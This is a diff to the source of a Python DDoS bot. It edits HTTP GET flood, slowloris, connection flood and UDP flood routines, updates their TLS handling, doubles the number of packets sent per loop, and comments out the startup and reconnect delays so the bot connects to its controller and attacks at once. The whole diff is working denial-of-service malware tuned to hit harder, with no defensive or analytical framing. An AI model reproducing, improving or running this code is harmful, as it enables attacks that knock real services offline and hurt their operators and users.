@@ -79,19 +79,22 @@ def HTTP(ip, port, path):
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
 			s.settimeout(5)
 			s.connect((str(ip), int(port)))
-			if port == 443:
-				s = ssl.wrap_socket(s)
-			for y in range(100):
-				get_host = "GET "+path+"?"+str(random.randint(0,50000))
-				for _ in range(10):
-					get_host += strings[random.randint(0,len(strings))]
-				get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
-				connection = "Connection: Keep-Alive\r\n"
-				useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-				accept = random.choice(acceptall)
-				http = get_host + useragent + accept + connection + "\r\n"
-				s.send(str.encode(http))
-			s.close()
+			if int(port) == 443:
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
+			connection = "Connection: Keep-Alive\r\n"
+			useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+			accept = random.choice(acceptall)
+			get_host = "GET "+path+"?"+str(random.randint(0,50000))
+			for _ in range(10):
+				get_host += strings[random.randint(0,len(strings))]
+			try:
+				for y in range(200):
+					get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					http = get_host + useragent + accept + connection + "\r\n"
+					s.send(str.encode(http))
+			except:
+				s.close()
 		except:
 			pass
 
@@ -109,8 +112,9 @@ def SLOW(ip, port, conns, path):#slowloris, reference from https:#github.com/gkb
 				break
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip), int(port)))
-			if port == 443:
-				s = ssl.wrap_socket(s)
+			if int(port) == 443:
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			s.send(str.encode(header))
 			socket_list.append(s)
 		except:
@@ -142,8 +146,9 @@ def CC(ip, port):#connection flood
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip),int(port)))
-			if port == 443:
-				s = ssl.wrap_socket(s)
+			if int(port) == 443:
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			s.send("\000".encode())
 			s.close()
 		except:
@@ -157,7 +162,7 @@ def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router
 		sendip=(str(ip),int(port))
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		try:
-			for y in range(100):
+			for y in range(200):
 				udpbytes = random._urandom(int(size))
 				s.sendto(udpbytes, sendip)
 			s.close()
@@ -351,7 +356,7 @@ def conn():
 				break
 
 		except:
-			time.sleep(random.randint(1,60))
+			#time.sleep(random.randint(1,60))
 			pass
 
 #xor enc part#
@@ -719,7 +724,7 @@ def gip():
 		return ip
 
 if __name__ == '__main__':
-	time.sleep(30+random.randint(0,60))
+	#time.sleep(30+random.randint(0,60))
 	conn()
 '''
 ............................-.-::::----------.---................................
